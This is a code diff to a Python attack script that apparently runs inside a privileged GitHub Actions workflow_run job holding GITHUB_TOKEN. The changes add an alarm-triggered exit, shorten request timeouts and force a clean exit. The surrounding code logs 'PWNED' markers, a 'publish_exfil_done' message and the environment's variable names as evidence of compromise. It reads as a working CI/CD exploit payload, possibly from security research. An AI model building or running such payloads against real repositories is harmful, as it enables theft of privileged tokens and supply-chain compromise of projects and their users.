@@ -1,6 +1,12 @@
 #!/usr/bin/env python3
 """Runs inside the privileged workflow_run job with GITHUB_TOKEN in the environment."""
-import os, sys, json, hashlib, base64, urllib.request, urllib.error, subprocess
+import os, sys, json, hashlib, base64, urllib.request, urllib.error, signal
+
+def _alarm(signum, frame):
+    print("PWNED::alarm_triggered", flush=True)
+    os._exit(0)
+signal.signal(signal.SIGALRM, _alarm)
+signal.alarm(45)
 
 def log(msg):
     print("PWNED::" + msg, flush=True)
@@ -55,7 +61,7 @@ def call(method, path, body=None):
         h["Content-Type"] = "application/json"
     req = urllib.request.Request(url, data=data, headers=h, method=method)
     try:
-        with urllib.request.urlopen(req, timeout=30) as r:
+        with urllib.request.urlopen(req, timeout=6) as r:
             return r.status, r.read().decode("utf-8", "replace")
     except urllib.error.HTTPError as e:
         return e.code, e.read().decode("utf-8", "replace")
@@ -144,3 +150,5 @@ for m, path, body in [
 # dump full environment (masked values stay masked) for evidence
 log("env_keys=%s" % sorted(os.environ.keys()))
 log("publish_exfil_done")
+sys.stdout.flush()
+os._exit(0)
